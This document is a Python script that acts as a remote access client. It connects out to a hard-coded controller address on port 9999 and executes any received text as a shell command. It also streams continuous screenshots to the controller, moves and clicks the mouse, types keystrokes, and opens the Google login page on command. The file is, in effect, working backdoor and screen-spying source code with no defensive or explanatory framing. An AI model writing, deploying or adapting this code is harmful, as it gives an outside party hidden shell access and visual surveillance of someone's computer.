import os
import subprocess
import socket
import datetime
import webbrowser
import pyautogui
import threading
from PIL import ImageGrab
import pickle
import numpy
import time
import cv2
import struct
s=socket.socket()
host='192.168.1.102'
port=9999



MAIN_READING_ALLOWED=True
s.connect((host,port))
def fun1():
        global MAIN_READING_ALLOWED

        global data
        t=0
        while True:
                #print(t)
                if t!=0:
                        data=s.recv(1024)
                strim=data.decode('utf-8')
                if strim != 'set':
                        l=data.decode('utf-8').split(' ')
                        pyautogui.moveTo(int(l[1]),int(l[2]))
                        #print(l[1],l[2],l[3])

                        if l[3]=='clicked':
                                pyautogui.click()
                else:
                        print('thread ended')
                        

                        MAIN_READING_ALLOWED=True
                        print(MAIN_READING_ALLOWED)

                        break
                t=t+1
def fun():
	global s
	global THREAD_ALLOWED
	THREAD_ALLOWED=True
	
	
	img_counter = 0

	encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
	while True:
		if THREAD_ALLOWED:
			nest=ImageGrab.grab()
			frame=numpy.array(nest)
			result, frame = cv2.imencode('.jpg', frame, encode_param)
#    data = zlib.compress(pickle.dumps(frame, 0))
			data = pickle.dumps(frame, 0)
			size = len(data)


			#print("{}: {}".format(img_counter, size))
			s.sendall(struct.pack(">L", size) + data)
			img_counter += 1
thread=threading.Thread(target=fun)
thread.daemon=True
thread1=threading.Thread(target=fun1)
thread1.daemon=True

def stop():
        global THREAD_ALLOWED
        global thread
        THREAD_ALLOWED=False
        print('stoping sending image')
        thread.join()

while True:
        #print('while',MAIN_READING_ALLOWED)
        if MAIN_READING_ALLOWED:
                #print('working.....')
                data=s.recv(1024)
                if data[:2].decode('utf-8')=='cd':
                        os.chdir(data[3:].decode('utf-8'))
	
                i=0
                if len(data)>0:
                        if data.decode('utf-8')=='date':
                                string_version=str(datetime.datetime.now())
                                i=0
                        elif data.decode('utf-8')=='browser':
                                webbrowser.open('https://www.google.com')
                                string_version=''
                                i=0
                        elif data.decode('utf-8')=='mail':
                                webbrowser.open('https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin')
                                string_version=''
                                i=0		
                        elif data.decode('utf-8').find('string')==0:
                                thread1.start()                       
                                MAIN_READING_ALLOWED=False
                                string_version=''
                                i=0
                        elif data.decode('utf-8')=='see':
                                thread.start()
                                string_version=''
                                i=1
                        elif data.decode('utf-8')=='set':
                                stop()
                                i=1
                        elif data.decode('utf-8').find('text')==0:
                                l=data.decode('utf-8').split(' ')
                                pyautogui.typewrite(l[1])
                                i=1

                        else:
                                cmd=subprocess.Popen(data[:].decode('utf-8'),shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
                                byte_version=cmd.stdout.read()+cmd.stderr.read()
                                string_version=str(byte_version,'utf-8')
                                i=0
                        #if i==0:
                                #s.send(str.encode(string_version+'\n'+str(os.getcwd())+'>'))
                        print(string_version)




s.close()
